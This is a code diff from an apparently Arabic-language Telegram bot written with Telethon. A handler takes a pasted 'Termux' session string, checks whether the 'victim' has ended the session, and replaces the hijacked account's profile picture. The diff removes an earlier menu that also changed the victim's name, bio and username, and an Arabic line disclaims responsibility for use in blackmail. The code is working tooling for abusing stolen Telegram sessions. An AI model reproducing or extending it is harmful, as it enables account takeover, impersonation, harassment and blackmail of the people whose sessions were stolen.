@@ -827,55 +827,18 @@ async def users(event):
         await event.respond(" غير مبري الذمه اذا استخدمت الامر للابتزاز اللهم اني بلغت فاشهد", buttons=keyboard)
 
 
-inline_keyboard = [
-    [  
-        Button.inline("Picture", data="pic"),
-        Button.inline("Name", data="Name"),
-        Button.inline("Bio", data="Bio"),
-        Button.inline("Username", data="Username")
-    ]
-]
-
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Z")))
 async def users(event):
     async with bot.conversation(event.chat_id) as x:
-        await x.send_message("ماذا تريد أن تغير ؟", buttons=inline_keyboard)  # Asking for the user's choice
-        response = await x.get_response()  # Getting the user's choice
-
         await x.send_message("الان ارسل الكود تيرمكس")
         strses = await x.get_response()
         op = await cu(strses.text)
-        if not op:
-            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
-
-        if response.data == b"Username":
-            await x.send_message("ارسل اليوزر الجديد")
-            new_username = await x.get_response()
-            await x.send_message("ارسل كود التيرمكس")
-            code = await x.get_response()
-            await change_username(strses.text, new_username.text, code.text)  # Using the function to change username
-            await event.reply("تم تغيير اليوزر بنجاح", buttons=inline_keyboard)
-
-        elif response.data == b"Name":
-            await x.send_message("ارسل الاسم الجديد")
-            new_name = await x.get_response()
-            await x.send_message("ارسل كود التيرمكس")
-            code = await x.get_response()
-            await change_name(strses.text, new_name.text, code.text)  # Using the function to change name
-            await event.reply("تم تغيير الاسم بنجاح", buttons=inline_keyboard)
-
-        elif response.data == b"Bio":
-            await x.send_message("ارسل البايو الجديد")
-            new_bio = await x.get_response()
-            await x.send_message("ارسل كود التيرمكس")
-            code = await x.get_response()
-            await change_bio(strses.text, new_bio.text, code.text)  # Using the function to change bio
-            await event.reply("تم تغيير البايو بنجاح", buttons=inline_keyboard)
-
-        elif response.data == b"Picture":
-            await x.send_message("ارسل الصورة الجديدة")
-            new_pic = await x.get_response()
-            await x.send_message("ارسل كود التيرمكس")
-            code = await x.get_response()
-            await change_pic(strses.text, new_pic.media.photo, code.text)  # Using the function to change picture
-            await event.reply("تم تغيير الصورة بنجاح", buttons=inline_keyboard)
+        if op:
+            pass
+        else:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+        await x.send_message("اعطني الصورة الجديدة")
+        new_pic_msg = await x.get_response()
+        new_pic = await new_pic_msg.download_media()
+        await change_pic(strses.text, new_pic)  # استلام الصوره هنا
+        await event.reply(" تم تغيير صورة الحساب بنجاح ", buttons=keyboard)
